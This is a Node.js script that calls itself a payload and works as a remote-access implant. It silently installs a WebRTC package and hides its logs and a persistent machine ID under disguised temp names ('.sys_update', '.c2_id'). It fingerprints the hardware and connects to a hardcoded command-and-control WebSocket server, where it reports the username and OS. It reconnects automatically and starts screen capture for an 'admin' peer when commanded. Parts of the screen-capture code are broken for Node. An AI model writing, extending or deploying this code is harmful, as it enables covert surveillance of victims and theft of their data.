const WebSocket = require('ws');
const { execSync } = require('child_process');
const os = require('os');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

try {
  const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
  if (!fs.existsSync(nodeModulesPath)) {
    execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
  }
} catch (e) {}

let wrtc;
try { wrtc = require('@roamhq/wrtc'); } catch (e) {}

const { RTCPeerConnection, RTCSessionDescription, mediaDevices } = wrtc || {};

const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

function log(msg) {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${msg}`);
  fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
}

log("[INIT] Payload starting...");

// POINTS TO YOUR RENDER SERVER
const WS_URL = 'wss://server-nuc6.onrender.com';

let myId = null;
let ws = null;
let reconnectAttempts = 0;
let isConnected = false;

// --- HARDWARE FINGERPRINT GENERATION ---
function getHardwareFingerprint() {
  const mac = getMacAddress();
  const cpuSerial = getCpuSerial();
  const boardSerial = getBoardSerial();
  return crypto.createHash('sha256').update(mac + cpuSerial + boardSerial).digest('hex').substr(0, 12);
}

function getMacAddress() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.mac;
      }
    }
  }
  return '00:00:00:00:00:00';
}

function getCpuSerial() {
  try { return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); }
  catch (e) {
    try { return execSync('cat /proc/cpuinfo | grep Serial | awk \'{print $3}\'').toString().trim(); }
    catch (e2) { return 'unknown_cpu'; }
  }
}

function getBoardSerial() {
  try { return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); }
  catch (e) {
    try { return execSync('sudo dmidecode -t system | grep Serial | awk \'{print $3}\'').toString().trim(); }
    catch (e2) { return 'unknown_board'; }
  }
}

// Try to load persistent ID from disk first
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
try {
  if (fs.existsSync(PERSIST_FILE)) {
    const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
    if (savedId && savedId.length > 0) myId = savedId;
  }
} catch(e) {}

if (!myId) {
  myId = getHardwareFingerprint();
  try { fs.writeFileSync(PERSIST_FILE, myId); } catch(e) {}
}

log(`[ID] Hardware Fingerprint: ${myId}`);

let peerConnection = null;
let localStream = null;

function initConnection() {
  log(`[WS] Attempting connection to ${WS_URL}...`);
  
  // Add error handler BEFORE connecting
  ws = new WebSocket(WS_URL);
  
  ws.on('error', (err) => {
    log(`[WS] Connection error: ${err.message}`);
    isConnected = false;
  });

  ws.on('open', () => {
    reconnectAttempts = 0;
    isConnected = true;
    safeSend(JSON.stringify({
      type: 'info',
      id: myId,           // <-- SEND AS 'id'
      uniqueId: myId,     // <-- ALSO SEND AS 'uniqueId'
      os: os.platform(),
      arch: os.arch(),
      user: os.userInfo().username,
      ip: '127.0.0.1'
    }));
    startMonitoring();
  });

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg);
      if (data.type === 'request_join') handleJoinRequest();
      else if (data.type === 'offer') handleOffer(data.sdp);
      else if (data.type === 'answer') handleAnswer(data.sdp);
      else if (data.type === 'candidate') handleCandidate(data.candidate);
    } catch (e) {}
  });

  ws.on('close', () => {
    isConnected = false;
    log(`[WS] Closed. Reconnecting in 5s...`);
    setTimeout(initConnection, 5000);
  });
}

function safeSend(msg) {
  if (ws && ws.readyState === WebSocket.OPEN) ws.send(msg);
}

function startMonitoring() {
  setInterval(() => {
    if (isConnected) safeSend(JSON.stringify({ type: 'heartbeat' }));
  }, 30000);
}

async function captureScreenPureJS() {
  if (!peerConnection) {
    peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
  }

  const transceivers = peerConnection.getTransceivers();
  transceivers.forEach(t => {
    if (t.sender.track) t.sender.stop();
  });

  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
    stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));

    peerConnection.onicecandidate = (event) => {
      if (event.candidate) safeSend(JSON.stringify({ type: 'candidate', targetId: 'admin', candidate: event.candidate }));
    };

    const offer = await peerConnection.createOffer();
    await peerConnection.setLocalDescription(offer);
    safeSend(JSON.stringify({ type: 'offer', targetId: 'admin', sdp: peerConnection.localDescription }));
  } catch (err) {
    log(`[WEBRTC] Screen capture error: ${err.message}`);
  }
}

function handleJoinRequest() {
  log("[JOIN] Request received. Starting screen share...");
  captureScreenPureJS();
}

function handleOffer(offerSDP) {
  if (!peerConnection) peerConnection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
  peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
    .then(() => peerConnection.createAnswer())
    .then(answer => peerConnection.setLocalDescription(answer))
    .then(() => safeSend(JSON.stringify({ type: 'answer', targetId: 'admin', sdp: peerConnection.localDescription })))
    .catch(err => log(`[WEBRTC] Error handling offer: ${err.message}`));
}

function handleAnswer(answerSDP) {
  if (peerConnection) peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP)).catch(err => log(`[WEBRTC] Error handling answer: ${err.message}`));
}

function handleCandidate(candidate) {
  if (peerConnection && candidate) peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(err => log(`[WEBRTC] Candidate error: ${err.message}`));
}

initConnection();
